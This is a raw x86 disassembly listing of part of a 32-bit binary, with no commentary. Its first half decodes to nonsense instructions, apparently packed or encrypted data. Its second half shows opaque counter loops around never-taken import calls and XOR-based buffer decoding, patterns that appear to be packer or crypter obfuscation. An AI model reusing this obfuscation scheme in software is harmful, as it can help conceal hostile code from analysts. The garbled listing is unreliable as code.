  40c5bd:	xlat   BYTE PTR ds:[ebx]
  40c5be:	lds    esp,FWORD PTR [edx+0x302a0051]
  40c5c4:	mov    ds:0x2d15f9a0,eax
  40c5c9:	add    BYTE PTR [ebx],bh
  40c5cb:	outs   dx,BYTE PTR ds:[esi]
  40c5cc:	pusha  
  40c5cd:	sub    edx,edi
  40c5cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c5d0:	imul   ebx,ebx,0xfffffff7
  40c5d3:	loop   0x40c5b1
  40c5d5:	ins    BYTE PTR es:[edi],dx
  40c5d6:	mov    eax,ds:0xe5eb1f99
  40c5db:	cs pushf 
  40c5dd:	test   BYTE PTR [edx+0x2a438ad6],0x69
  40c5e4:	lods   al,BYTE PTR ds:[esi]
  40c5e5:	inc    ebp
  40c5e6:	sbb    BYTE PTR [ebx-0x6deb5ae7],ah
  40c5ec:	jns    0x40c596
  40c5ee:	nop
  40c5ef:	loop   0x40c5ea
  40c5f1:	aaa    
  40c5f2:	outs   dx,BYTE PTR ds:[esi]
  40c5f3:	xchg   BYTE PTR [edx+0x494c9de2],ah
  40c5f9:	push   0xca8c511e
  40c5fe:	add    al,0xfa
  40c600:	sbb    esi,DWORD PTR [esi]
  40c602:	xor    eax,0xaae22af2
  40c607:	push   esp
  40c608:	ret    0x1ac0
  40c60b:	(bad)  
  40c60d:	mov    dh,dh
  40c60f:	leave  
  40c610:	mov    bl,0x15
  40c612:	push   edi
  40c613:	cmc    
  40c614:	fimul  WORD PTR [ecx+0x60be6271]
  40c61a:	sti    
  40c61b:	jb     0x40c66d
  40c61d:	inc    eax
  40c61e:	cld    
  40c61f:	push   edi
  40c620:	mov    ch,0xe1
  40c622:	pop    eax
  40c623:	ror    edx,cl
  40c625:	pop    ebx
  40c626:	add    al,0x13
  40c628:	jecxz  0x40c6a0
  40c62a:	out    dx,al
  40c62b:	mov    esi,0x72694a11
  40c630:	inc    esi
  40c631:	adc    ah,ah
  40c633:	out    0xc3,al
  40c635:	lea    edi,[esi-0x70]
  40c638:	pop    esp
  40c639:	sub    edx,DWORD PTR [ebp+0x4ced2b05]
  40c63f:	outs   dx,DWORD PTR ds:[esi]
  40c640:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c641:	cmp    al,0xe4
  40c643:	arpl   si,ax
  40c645:	mov    edx,0x8e1af1eb
  40c64a:	test   al,0xf8
  40c64c:	mov    ds:0x69c6235e,al
  40c651:	cwde   
  40c652:	jbe    0x40c63b
  40c654:	sbb    al,0x17
  40c656:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c657:	and    BYTE PTR [eax],ah
  40c659:	dec    esi
  40c65a:	ja     0x40c615
  40c65c:	nop
  40c65d:	add    eax,0x8d97b4b0
  40c662:	ficomp WORD PTR [edi+0x3a]
  40c665:	shr    BYTE PTR [ebx],0x8b
  40c668:	mov    BYTE PTR [edi-0x36],dl
  40c66b:	adc    DWORD PTR [edx],0xcc4c5e0a
  40c671:	mov    ds:0xfa3b3b2e,eax
  40c676:	iret   
  40c677:	mov    eax,0xbd4848ea
  40c67c:	push   ds
  40c67d:	xor    al,0xbc
  40c67f:	into   
  40c680:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c681:	jo     0x40c6fb
  40c683:	hlt    
  40c684:	test   DWORD PTR [edi],ebp
  40c686:	jmp    0x40c66f
  40c688:	sar    eax,0xd2
  40c68b:	in     eax,dx
  40c68c:	mov    ecx,0x5ba5c3e4
  40c691:	mov    eax,0x1f7a3bfd
  40c696:	aas    
  40c697:	and    BYTE PTR [ebx],ch
  40c699:	jns    0x40c699
  40c69b:	(bad)  
  40c69d:	add    edx,DWORD PTR [ecx]
  40c69f:	sub    DWORD PTR [esi],ebp
  40c6a1:	pop    edi
  40c6a2:	sbb    al,BYTE PTR ds:0xdba16391
  40c6a8:	sbb    eax,0xb9675296
  40c6ad:	jmp    0x40c71b
  40c6af:	imul   esi,DWORD PTR [ebx-0x1043a460],0xffffffc1
  40c6b6:	mov    cl,0xba
  40c6b8:	shl    BYTE PTR [esi-0x10],cl
  40c6bb:	jbe    0x40c646
  40c6bd:	(bad)  
  40c6be:	cmp    bl,ah
  40c6c0:	mov    ebx,0x9a3e50d7
  40c6c5:	mov    bh,0xd3
  40c6c7:	mov    al,ds:0x70405bf3
  40c6cc:	jmp    0xfac80aa3
  40c6d1:	es stc 
  40c6d3:	mov    ds:0x50f42ba4,eax
  40c6d8:	repz scas eax,DWORD PTR es:[edi]
  40c6da:	fistp  WORD PTR [edi-0x50]
  40c6dd:	jmp    0xc74b6c59
  40c6e2:	pop    eax
  40c6e3:	dec    edi
  40c6e4:	ficom  DWORD PTR [ecx]
  40c6e6:	or     bl,BYTE PTR [edi+0x28d1d3e6]
  40c6ec:	mov    bl,0x3
  40c6ee:	je     0x40c6cd
  40c6f0:	mov    ds:0x3b594c8f,eax
  40c6f5:	mov    ebp,0x3ebf222a
  40c6fa:	mov    ecx,0x2da7c82d
  40c6ff:	je     0x40c751
  40c701:	push   ds
  40c702:	in     al,0x3a
  40c704:	add    ebx,DWORD PTR [ebx+0x204debab]
  40c70a:	loope  0x40c6e1
  40c70c:	jb     0x40c6aa
  40c70e:	inc    ecx
  40c70f:	inc    ebx
  40c710:	(bad)  
  40c712:	jmp    0xa505e2a0
  40c717:	fwait
  40c718:	sar    BYTE PTR [eax+0x4c912c5b],cl
  40c71e:	and    DWORD PTR [esi+0x77],0xffffffe6
  40c722:	sti    
  40c723:	jl     0x40c799
  40c725:	push   esp
  40c726:	test   dl,dl
  40c728:	add    al,BYTE PTR ds:0xa711b43e
  40c72e:	imul   esi,DWORD PTR [ecx-0x4b],0xffffffcc
  40c732:	mov    ds,ecx
  40c734:	daa    
  40c735:	rcr    BYTE PTR [edi],1
  40c737:	push   ecx
  40c738:	sub    eax,esi
  40c73a:	(bad)  
  40c73b:	fldcw  WORD PTR [eax-0xe0bd956]
  40c741:	push   ds
  40c742:	fnstenv [eax+0x14b601f4]
  40c748:	mov    WORD PTR [edi],?
  40c74a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c74b:	mul    DWORD PTR [edx+0xa]
  40c74e:	or     esp,DWORD PTR [edx-0x1f1e4158]
  40c754:	lahf   
  40c755:	adc    dl,bl
  40c757:	cmp    eax,0x14860ecd
  40c75c:	lods   al,BYTE PTR ds:[esi]
  40c75d:	cs popf 
  40c75f:	adc    al,0x94
  40c761:	dec    esi
  40c762:	sbb    esi,ebx
  40c764:	sbb    BYTE PTR [ecx],bl
  40c766:	fdiv   QWORD PTR [ebx+0x1476d10e]
  40c76c:	xchg   edi,eax
  40c76d:	cmc    
  40c76e:	int    0xc9
  40c770:	pop    ds
  40c771:	xchg   ebp,eax
  40c772:	bound  esi,QWORD PTR [esi+0x721d1b9e]
  40c778:	dec    edx
  40c779:	bound  ebp,QWORD PTR [eax+0x3]
  40c77c:	sbb    ecx,eax
  40c77e:	arpl   WORD PTR [ebx+0x471fc93e],dx
  40c784:	add    eax,0x3ab6de1e
  40c789:	retf   0x3de3
  40c78c:	cld    
  40c78d:	or     ebp,esp
  40c78f:	push   cs
  40c790:	sar    esp,cl
  40c792:	mov    eax,ds:0xb3c9cba2
  40c797:	push   edi
  40c798:	inc    esp
  40c799:	jbe    0x40c807
  40c79b:	inc    ebx
  40c79c:	mov    bl,BYTE PTR gs:[ecx]
  40c79f:	gs dec ebp
  40c7a1:	jo     0x40c73e
  40c7a3:	in     al,dx
  40c7a4:	aam    0xda
  40c7a6:	dec    edx
  40c7a7:	push   edx
  40c7a8:	loop   0x40c812
  40c7aa:	aam    0xbc
  40c7ac:	jecxz  0x40c7af
  40c7ae:	pushf  
  40c7af:	cmp    eax,0x7b90fdb
  40c7b4:	mov    ebx,0x9c2a14ce
  40c7b9:	cmp    edi,DWORD PTR [ebx+edx*2-0x5c]
  40c7bd:	jmp    0x40c79b
  40c7bf:	sbb    eax,0x3452682f
  40c7c4:	sbb    esi,DWORD PTR cs:[eax-0x7543bab]
  40c7cb:	push   cs
  40c7cc:	adc    ebp,edx
  40c7ce:	fucompp 
  40c7d0:	mov    esp,0x3d8bc8b
  40c7d5:	lds    ecx,FWORD PTR [esi-0x66]
  40c7d8:	mov    ah,0x55
  40c7da:	test   al,0x2d
  40c7dc:	dec    edx
  40c7dd:	jmp    0x1788:0x6c06cb8f
  40c7e4:	xor    DWORD PTR [ecx+esi*8+0x42],esp
  40c7e8:	mov    esi,DWORD PTR [eax-0x19]
  40c7eb:	rcr    DWORD PTR [eax],cl
  40c7ed:	pop    eax
  40c7ee:	push   cs
  40c7ef:	dec    eax
  40c7f0:	dec    esp
  40c7f1:	adc    eax,0xa4b2412
  40c7f6:	inc    ecx
  40c7f7:	je     0x40c7a8
  40c7f9:	dec    esi
  40c7fa:	xor    al,0x24
  40c7fc:	mov    ebx,0x2440dfdf
  40c801:	pop    edx
  40c802:	pushf  
  40c803:	xor    DWORD PTR [ebx],ecx
  40c805:	iret   
  40c806:	lods   al,BYTE PTR ds:[esi]
  40c807:	das    
  40c808:	ins    BYTE PTR es:[edi],dx
  40c809:	stos   BYTE PTR es:[edi],al
  40c80a:	add    BYTE PTR [ebx-0x176b3db2],dl
  40c810:	jae    0x40c7d7
  40c812:	cmp    al,0xb
  40c814:	push   ebp
  40c815:	clc    
  40c816:	xchg   ecx,eax
  40c817:	pop    DWORD PTR [edi+edi*4]
  40c81a:	mov    WORD PTR [esp+ebx*2],?
  40c81d:	popf   
  40c81e:	sahf   
  40c81f:	xchg   ecx,eax
  40c820:	frstor [ecx+0x1e]
  40c823:	test   al,cl
  40c825:	mov    edx,0xf2f4736d
  40c82a:	das    
  40c82b:	jp     0x40c7f1
  40c82d:	arpl   WORD PTR [edx],si
  40c82f:	daa    
  40c830:	push   esp
  40c831:	sbb    bh,BYTE PTR [ebp+0x340fd8d0]
  40c837:	into   
  40c838:	pop    ecx
  40c839:	sbb    al,0xe
  40c83b:	xchg   ebp,eax
  40c83c:	dec    ecx
  40c83d:	xchg   BYTE PTR [ebp-0x6f],bl
  40c840:	repnz mov al,ds:0xc74c9504
  40c846:	shl    BYTE PTR [edx+0x321177c3],1
  40c84c:	test   BYTE PTR cs:[esi+0x5a],bl
  40c850:	pop    es
  40c851:	in     eax,0x7b
  40c853:	xor    eax,0xecc8b027
  40c858:	mov    al,ds:0x995129d4
  40c85d:	adc    eax,0xfe40712
  40c862:	cmp    BYTE PTR [ecx-0x1cf51ce2],ah
  40c868:	loop   0x40c8e4
  40c86a:	dec    DWORD PTR [esp+edi*2-0x1d]
  40c86e:	(bad)  
  40c86f:	fdivr  DWORD PTR [ebp+0x3fbea916]
  40c875:	lahf   
  40c876:	adc    BYTE PTR [edi+0x3520a756],ch
  40c87c:	clc    
  40c87d:	inc    edx
  40c87e:	cmp    dl,dl
  40c880:	shl    BYTE PTR [eax+eax*1+0x1709eeef],0x93
  40c888:	fstp   TBYTE PTR [ebp+ecx*4+0x688ee063]
  40c88f:	imul   esi,eax,0x63209247
  40c895:	ror    DWORD PTR [eax-0x7070d736],1
  40c89b:	cmc    
  40c89c:	cmp    BYTE PTR [ebx-0x5],dl
  40c89f:	inc    ebp
  40c8a0:	pop    ds
  40c8a1:	call   0x1319:0x9b47c6e0
  40c8a8:	mov    DWORD PTR [ecx],esp
  40c8aa:	jo     0x40c8aa
  40c8ac:	sbb    DWORD PTR [ecx+0x3b],ebp
  40c8af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c8b0:	das    
  40c8b1:	rol    DWORD PTR [ebp+0x670293c5],0xf0
  40c8b8:	mov    ebx,0xf7b45bdc
  40c8bd:	push   0xffffffce
  40c8bf:	mov    edi,0x4b60ae80
  40c8c4:	sbb    bl,BYTE PTR [ebx+eax*8+0x31]
  40c8c8:	xor    al,0x1d
  40c8ca:	(bad)  
  40c8cb:	mov    ecx,0x40b5dd9e
  40c8d0:	and    ah,cl
  40c8d2:	icebp  
  40c8d3:	mov    DWORD PTR [esi],ebx
  40c8d5:	jb     0x40c86d
  40c8d7:	adc    eax,0x6cb287b3
  40c8dc:	inc    edi
  40c8dd:	cmp    al,0x3d
  40c8df:	mov    al,0xb9
  40c8e1:	dec    ecx
  40c8e2:	mov    dl,cl
  40c8e4:	adc    eax,0xab06fb22
  40c8e9:	and    al,0xe3
  40c8eb:	adc    ch,bl
  40c8ed:	test   BYTE PTR [edx+0x3a2847d3],al
  40c8f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c8f4:	pop    ds
  40c8f5:	dec    edx
  40c8f6:	jnp    0x40c93e
  40c8f8:	sub    cl,BYTE PTR [eax+0x18]
  40c8fb:	xchg   esi,eax
  40c8fc:	into   
  40c8fd:	jg     0x40c93e
  40c8ff:	xor    edx,ebp
  40c901:	dec    esi
  40c902:	mov    ds:0x332af908,al
  40c907:	daa    
  40c908:	push   ss
  40c909:	fist   WORD PTR [ecx]
  40c90b:	cmp    eax,0x124e1b40
  40c910:	ret    
  40c911:	xor    edi,0x8b97a035
  40c917:	les    esi,FWORD PTR [edx-0x3a9aef60]
  40c91d:	add    bl,BYTE PTR [ebx]
  40c91f:	call   0x63c1:0xeeee35cd
  40c926:	inc    edi
  40c927:	pop    ecx
  40c928:	pusha  
  40c929:	div    dl
  40c92b:	or     DWORD PTR [esi-0x41],ebx
  40c92e:	arpl   WORD PTR [ebx-0x18],bp
  40c931:	shr    BYTE PTR [ebx+eax*8-0x6d],1
  40c935:	sub    DWORD PTR [esp+ecx*2],edi
  40c938:	or     BYTE PTR [ebx],dh
  40c93a:	sbb    BYTE PTR [ebx+ecx*2],cl
  40c93d:	aaa    
  40c93e:	retf   
  40c93f:	(bad)  
  40c940:	retf   
  40c941:	shr    ecx,cl
  40c943:	push   0x1ed7e538
  40c948:	enter  0x96b4,0xca
  40c94c:	and    al,0x8
  40c94e:	jp     0x40c8d1
  40c950:	add    al,0x2d
  40c952:	mov    bl,0x25
  40c954:	rcl    DWORD PTR [esp+ebp*4-0x77],1
  40c958:	pop    es
  40c959:	sub    eax,0xd19ca66b
  40c95e:	push   esp
  40c95f:	mov    DWORD PTR [ebp-0x8],0xf89c85b1
  40c966:	xor    DWORD PTR ds:0x413d34,0x2984
  40c970:	mov    ecx,DWORD PTR [ebp-0x14]
  40c973:	and    DWORD PTR ds:0x413d24,0x0
  40c97d:	jmp    0x40c990
  40c982:	xor    eax,eax
  40c984:	or     eax,DWORD PTR ds:0x413d24
  40c98a:	inc    eax
  40c98b:	mov    ds:0x413d24,eax
  40c990:	cmp    DWORD PTR ds:0x413d24,0x18
  40c997:	jae    0x40ca0e
  40c99d:	cmp    DWORD PTR ds:0x413d24,0x20
  40c9a4:	jne    0x40c9bd
  40c9aa:	push   0x738d
  40c9af:	push   0x6edb
  40c9b4:	push   DWORD PTR [ebp-0x18]
  40c9b7:	call   DWORD PTR ds:0x416768
  40c9bd:	jmp    0x40c982
  40c9c2:	mov    DWORD PTR ds:0x413c1e,0x1e
  40c9cc:	cmp    DWORD PTR ds:0x413c1e,0x0
  40c9d3:	je     0x40ca0e
  40c9d9:	cmp    DWORD PTR ds:0x413c1e,0x2c
  40c9e0:	jne    0x40c9fe
  40c9e6:	push   0x25a0
  40c9eb:	push   0x413ce4
  40c9f0:	push   0x3cd5
  40c9f5:	push   DWORD PTR [ebp-0x18]
  40c9f8:	call   DWORD PTR ds:0x416770
  40c9fe:	mov    eax,ds:0x413c1e
  40ca03:	dec    eax
  40ca04:	mov    ds:0x413c1e,eax
  40ca09:	jmp    0x40c9cc
  40ca0e:	push   esi
  40ca0f:	sbb    DWORD PTR ds:0x413ce4,0x7973
  40ca19:	mov    eax,0x7510894
  40ca1e:	and    DWORD PTR ds:0x413c1e,0x0
  40ca28:	jmp    0x40ca3a
  40ca2d:	mov    esi,DWORD PTR ds:0x413c1e
  40ca33:	inc    esi
  40ca34:	mov    DWORD PTR ds:0x413c1e,esi
  40ca3a:	cmp    DWORD PTR ds:0x413c1e,0x15
  40ca41:	jae    0x40ca74
  40ca47:	cmp    DWORD PTR ds:0x413c1e,0x1f
  40ca4e:	jne    0x40ca6e
  40ca54:	push   0x413c12
  40ca59:	push   0x88a1
  40ca5e:	push   0x416000
  40ca63:	push   0x416152
  40ca68:	call   DWORD PTR ds:0x416774
  40ca6e:	jmp    0x40ca2d
  40ca73:	inc    esi
  40ca74:	xor    ecx,eax
  40ca76:	sub    esi,DWORD PTR ds:0x413c70
  40ca7c:	mov    esi,0x3272dc
  40ca81:	mov    DWORD PTR ds:0x413c80,0x12bb
  40ca8b:	push   edi
  40ca8c:	xor    DWORD PTR ds:0x413ce4,0x413c6c
  40ca96:	add    ecx,esi
  40ca98:	jmp    0x40cab4
  40ca9d:	mov    dl,BYTE PTR [ebp-0x1]
  40caa0:	not    DWORD PTR ds:0x41400c
  40caa6:	mov    BYTE PTR [ebp+ecx*1-0xa4],dl
  40caad:	not    DWORD PTR ds:0x413ce8
  40cab3:	inc    ecx
  40cab4:	cmp    ecx,0x40
  40cab7:	mov    DWORD PTR ds:0x413d24,0x3f58
  40cac1:	jb     0x40ca9d
  40cac7:	adc    edx,0x503d
  40cacd:	mov    edx,DWORD PTR [ebp-0x14]
  40cad0:	xor    edx,eax
  40cad2:	add    edx,esi
  40cad4:	jmp    0x40cc01
  40cad9:	and    DWORD PTR ds:0x413c0a,0x1a66
  40cae3:	mov    edi,DWORD PTR [ebp+0x8]
  40cae6:	and    ecx,0xcf4
  40caec:	mov    ecx,0x8a87
  40caf1:	adc    DWORD PTR ds:0x413c12,0x413d
  40cafb:	xor    cx,WORD PTR [edi+edx*4+0x2]
  40cb00:	and    DWORD PTR ds:0x41401c,0x0
  40cb0a:	mov    edi,DWORD PTR ds:0x41401c
  40cb10:	inc    edi
  40cb11:	mov    DWORD PTR ds:0x41401c,edi
  40cb17:	cmp    DWORD PTR ds:0x41401c,0x5
  40cb1e:	jne    0x40cb39
  40cb24:	push   0x6acf
  40cb29:	push   0x413cf4
  40cb2e:	push   0x416152
  40cb33:	call   DWORD PTR ds:0x416778
  40cb39:	cmp    DWORD PTR ds:0x41401c,0x4
  40cb40:	jne    0x40cb53
  40cb46:	mov    edi,DWORD PTR ds:0x41401c
  40cb4c:	inc    edi
  40cb4d:	mov    DWORD PTR ds:0x41401c,edi
  40cb53:	cmp    DWORD PTR ds:0x41401c,0x1b
  40cb5a:	jb     0x40cb0a
  40cb60:	mov    DWORD PTR ds:0x414018,0x15
  40cb6a:	cmp    DWORD PTR ds:0x414018,0x0
  40cb71:	je     0x40cbab
  40cb77:	cmp    DWORD PTR ds:0x414018,0x1b
  40cb7e:	jne    0x40cb8f
  40cb84:	push   0x4160b3
  40cb89:	call   DWORD PTR ds:0x41677c
  40cb8f:	mov    edi,DWORD PTR ds:0x414018
  40cb95:	dec    edi
  40cb96:	mov    DWORD PTR ds:0x414018,edi
  40cb9c:	jmp    0x40cb6a
  40cba1:	xor    DWORD PTR ds:0x414008,0x3196
  40cbab:	mov    edi,0x3b4a
  40cbb0:	add    cx,di
  40cbb3:	sbb    DWORD PTR ds:0x414000,0x24d3
  40cbbd:	movzx  ecx,cx
  40cbc0:	xor    DWORD PTR ds:0x413bfe,0x413c06
  40cbca:	mov    DWORD PTR [ebp-0x10],ecx
  40cbcd:	neg    DWORD PTR ds:0x413c0e
  40cbd3:	mov    ecx,DWORD PTR [ebp+0x8]
  40cbd6:	or     DWORD PTR ds:0x413d20,0x3470
  40cbe0:	movzx  ecx,WORD PTR [ecx+edx*4]
  40cbe4:	xor    DWORD PTR ds:0x413d30,0x413bf6
  40cbee:	xor    ecx,0x8a87
  40cbf4:	add    ecx,edi
  40cbf6:	mov    edi,DWORD PTR [ebp-0x10]
  40cbf9:	mov    BYTE PTR [ebp+edi*1-0xa4],cl
  40cc00:	inc    edx
  40cc01:	mov    ecx,DWORD PTR [ebp-0x18]
  40cc04:	cmp    edx,ecx
  40cc06:	mov    DWORD PTR ds:0x414010,0x5811
  40cc10:	jne    0x40cad9
  40cc16:	mov    ecx,DWORD PTR [ebp-0x14]
  40cc19:	mov    DWORD PTR ds:0x413d1c,0x410a
  40cc23:	mov    edx,DWORD PTR [ebp+0x10]
  40cc26:	dec    DWORD PTR ds:0x413cec
  40cc2c:	xor    ecx,eax
  40cc2e:	add    ecx,esi
  40cc30:	and    DWORD PTR ds:0x413c0a,0x5ecf
  40cc3a:	mov    DWORD PTR [edx],ecx
  40cc3c:	dec    ecx
  40cc3d:	mov    ecx,DWORD PTR [ebp-0x14]
  40cc40:	xor    ecx,eax
  40cc42:	and    DWORD PTR ds:0x413bf6,0x413c84
  40cc4c:	add    ecx,esi
  40cc4e:	mov    DWORD PTR ds:0x413c0a,0x45cc
  40cc58:	mov    DWORD PTR [ebp-0x20],ecx
  40cc5b:	not    ecx
  40cc5d:	mov    DWORD PTR [ebp+0x8],0xf89c85b0
  40cc64:	mov    DWORD PTR [ebp-0xc],0xf89c85a0
  40cc6b:	mov    DWORD PTR [ebp-0x1c],0xf89c95b0
  40cc72:	mov    DWORD PTR ds:0x413c6c,edi
  40cc78:	mov    ecx,DWORD PTR [ebp-0xc]
  40cc7b:	mov    DWORD PTR ds:0x413c84,0x129c
  40cc85:	mov    DWORD PTR [ebp+0x8],ecx
  40cc88:	jmp    0x40ce75
  40cc8d:	mov    ecx,DWORD PTR [ebp+0x8]
  40cc90:	add    edx,DWORD PTR ds:0x413c80
  40cc96:	mov    edx,DWORD PTR [ebp-0x8]
  40cc99:	and    DWORD PTR ds:0x413c74,0x413d20
  40cca3:	xor    ecx,eax
  40cca5:	xor    edx,eax
  40cca7:	sub    ecx,edx
  40cca9:	sub    ecx,esi
  40ccab:	xor    ecx,eax
  40ccad:	and    DWORD PTR ds:0x413c1a,0x0
  40ccb7:	mov    edx,DWORD PTR ds:0x413c1a
  40ccbd:	inc    edx
  40ccbe:	mov    DWORD PTR ds:0x413c1a,edx
  40ccc4:	cmp    DWORD PTR ds:0x413c1a,0x9
  40cccb:	jne    0x40cce4
  40ccd1:	push   0x413bfe
  40ccd6:	push   DWORD PTR [ebp-0x20]
  40ccd9:	push   0x4160ed
  40ccde:	call   DWORD PTR ds:0x416780
  40cce4:	cmp    DWORD PTR ds:0x413c1a,0x8
  40cceb:	jne    0x40ccfe
  40ccf1:	mov    edx,DWORD PTR ds:0x413c1a
  40ccf7:	inc    edx
  40ccf8:	mov    DWORD PTR ds:0x413c1a,edx
  40ccfe:	cmp    DWORD PTR ds:0x413c1a,0x10
  40cd05:	jb     0x40ccb7
  40cd0b:	mov    DWORD PTR [ebp+0x8],ecx
  40cd0e:	adc    ecx,ecx
  40cd10:	mov    ecx,DWORD PTR [ebp+0x8]
  40cd13:	mov    DWORD PTR ds:0x413c16,0x3405
  40cd1d:	mov    edx,DWORD PTR [ebp-0x64]
  40cd20:	lea    ecx,[edx+ecx*1+0x5708f1]
  40cd27:	mov    DWORD PTR [ebp-0x64],ecx
  40cd2a:	mov    ecx,DWORD PTR [ebp+0x8]
  40cd2d:	mov    edx,DWORD PTR [ebp-0x60]
  40cd30:	lea    ecx,[edx+ecx*1+0x5708f1]
  40cd37:	movzx  edx,WORD PTR ds:0x413d20
  40cd3e:	sbb    edx,DWORD PTR ds:0x413d28
  40cd44:	mov    DWORD PTR ds:0x413d20,edx
  40cd4a:	mov    DWORD PTR [ebp-0x60],ecx
  40cd4d:	and    DWORD PTR ds:0x414000,0x413d1c
  40cd57:	mov    ecx,DWORD PTR [ebp+0x8]
  40cd5a:	add    DWORD PTR ds:0x413c78,ebx
  40cd60:	mov    edx,DWORD PTR [ebp-0x5c]
  40cd63:	neg    DWORD PTR ds:0x413c02
  40cd69:	lea    ecx,[edx+ecx*1+0x5708f2]
  40cd70:	and    DWORD PTR ds:0x413d20,0x0
  40cd7a:	mov    edx,DWORD PTR ds:0x413d20
  40cd80:	inc    edx
  40cd81:	mov    DWORD PTR ds:0x413d20,edx
  40cd87:	cmp    DWORD PTR ds:0x413d20,0xa
  40cd8e:	jne    0x40cda2
  40cd94:	push   0x413d34
  40cd99:	push   DWORD PTR [ebp-0x24]
  40cd9c:	call   DWORD PTR ds:0x416784
  40cda2:	cmp    DWORD PTR ds:0x413d20,0x9
  40cda9:	jne    0x40cdbe
  40cdaf:	xor    edx,edx
  40cdb1:	add    edx,DWORD PTR ds:0x413d20
  40cdb7:	inc    edx
  40cdb8:	mov    DWORD PTR ds:0x413d20,edx
  40cdbe:	cmp    DWORD PTR ds:0x413d20,0x15
  40cdc5:	jb     0x40cd7a
  40cdcb:	or     DWORD PTR ds:0x413ce8,0x2ce1
  40cdd5:	mov    DWORD PTR [ebp-0x5c],ecx
  40cdd8:	mov    ecx,DWORD PTR [ebp+0x8]
  40cddb:	add    DWORD PTR ds:0x413c1e,ecx
  40cde1:	mov    edx,DWORD PTR [ebp-0x58]
  40cde4:	lea    ecx,[edx+ecx*1+0x5708f3]
  40cdeb:	add    DWORD PTR ds:0x413bfe,ebx
  40cdf1:	mov    DWORD PTR [ebp-0x58],ecx
  40cdf4:	mov    ecx,DWORD PTR [ebp+0x8]
  40cdf7:	or     DWORD PTR ds:0x413c80,0x1524
  40ce01:	mov    edx,DWORD PTR [ebp-0x54]
  40ce04:	lea    ecx,[edx+ecx*1+0x5708fc]
  40ce0b:	adc    edx,DWORD PTR ds:0x41400c
  40ce11:	mov    DWORD PTR [ebp-0x54],ecx
  40ce14:	and    DWORD PTR ds:0x413d20,0x0
  40ce1e:	mov    edx,DWORD PTR ds:0x413d20
  40ce24:	inc    edx
  40ce25:	mov    DWORD PTR ds:0x413d20,edx
  40ce2b:	cmp    DWORD PTR ds:0x413d20,0x12
  40ce32:	jne    0x40ce48
  40ce38:	push   0x8060
  40ce3d:	push   0x41608d
  40ce42:	call   DWORD PTR ds:0x41678c
  40ce48:	cmp    DWORD PTR ds:0x413d20,0x10
  40ce4f:	jb     0x40ce1e
  40ce55:	mov    ecx,DWORD PTR [ebp+0x8]
  40ce58:	sbb    edx,DWORD PTR ds:0x413c0e
  40ce5e:	mov    edx,DWORD PTR [ebp-0x50]
  40ce61:	sbb    DWORD PTR ds:0x413cf4,0x413c16
  40ce6b:	lea    ecx,[edx+ecx*1+0x5708fd]
  40ce72:	mov    DWORD PTR [ebp-0x50],ecx
  40ce75:	and    DWORD PTR ds:0x413c12,0x0
  40ce7f:	mov    ecx,DWORD PTR ds:0x413c12
  40ce85:	inc    ecx
  40ce86:	mov    DWORD PTR ds:0x413c12,ecx
  40ce8c:	cmp    DWORD PTR ds:0x413c12,0x1d
  40ce93:	jne    0x40ceb7
  40ce99:	push   DWORD PTR [ebp-0x20]
  40ce9c:	push   0x413c70
  40cea1:	push   0x4dec
  40cea6:	push   0x4160bf
  40ceab:	push   DWORD PTR [ebp-0x20]
  40ceae:	push   DWORD PTR [ebp-0x10]
  40ceb1:	call   DWORD PTR ds:0x416790
  40ceb7:	cmp    DWORD PTR ds:0x413c12,0x11
  40cebe:	jb     0x40ce7f
  40cec4:	mov    ecx,DWORD PTR [ebp+0x8]
  40cec7:	xor    ecx,eax
  40cec9:	add    ecx,esi
  40cecb:	jne    0x40cc8d
  40ced1:	jmp    0x40f43d
  40ced6:	mov    ecx,DWORD PTR [ebp-0x1c]
  40ced9:	mov    edx,DWORD PTR [ebp-0x8]
  40cedc:	xor    ecx,eax
  40cede:	xor    edx,eax
  40cee0:	sub    ecx,edx
  40cee2:	sub    ecx,esi
  40cee4:	xor    ecx,eax
  40cee6:	mov    DWORD PTR [ebp-0x1c],ecx
  40cee9:	mov    ecx,DWORD PTR [ebp-0xc]
  40ceec:	mov    DWORD PTR [ebp+0x8],ecx
  40ceef:	jmp    0x40cf21
  40cef4:	mov    ecx,DWORD PTR [ebp+0x8]
  40cef7:	mov    edx,DWORD PTR [ebp-0x8]
  40cefa:	xor    ecx,eax
  40cefc:	xor    edx,eax
  40cefe:	sub    ecx,edx
  40cf00:	sub    ecx,esi
  40cf02:	xor    ecx,eax
  40cf04:	mov    DWORD PTR [ebp+0x8],ecx
  40cf07:	mov    ecx,DWORD PTR [ebp+0x8]
  40cf0a:	mov    edx,DWORD PTR [ebp+0x8]
  40cf0d:	imul   edx,edx,0x5708f1
  40cf13:	xor    ecx,eax
  40cf15:	add    ecx,esi
  40cf17:	lea    ecx,[ebp+ecx*4-0x64]
  40cf1b:	mov    edi,DWORD PTR [ecx]
  40cf1d:	add    edx,edi
  40cf1f:	mov    DWORD PTR [ecx],edx
  40cf21:	mov    ecx,DWORD PTR [ebp+0x8]
  40cf24:	xor    ecx,eax
  40cf26:	add    ecx,esi
  40cf28:	jne    0x40cef4
  40cf2e:	mov    ecx,DWORD PTR [ebp-0x20]
  40cf31:	mov    cl,BYTE PTR [ebp+ecx*1-0xa4]
  40cf38:	mov    dl,BYTE PTR [ebp-0x1]
  40cf3b:	cmp    cl,dl
  40cf3d:	je     0x40f39e
  40cf43:	mov    ecx,DWORD PTR [ebp-0x20]
  40cf46:	mov    cl,BYTE PTR [ebp+ecx*1-0xa4]
  40cf4d:	mov    edx,DWORD PTR [ebp+0xc]
  40cf50:	cmp    cl,BYTE PTR [edx]
  40cf52:	jne    0x40f44f
  40cf58:	mov    ecx,DWORD PTR [ebp-0x14]
  40cf5b:	mov    edx,DWORD PTR [ebp+0xc]
  40cf5e:	movsx  edx,BYTE PTR [edx]
  40cf61:	xor    ecx,eax
  40cf63:	add    ecx,esi
  40cf65:	cmp    edx,ecx
  40cf67:	mov    ecx,DWORD PTR [ebp-0xc]
  40cf6a:	mov    DWORD PTR [ebp+0x8],ecx
  40cf6d:	mov    ecx,DWORD PTR [ebp+0x8]
  40cf70:	je     0x411851
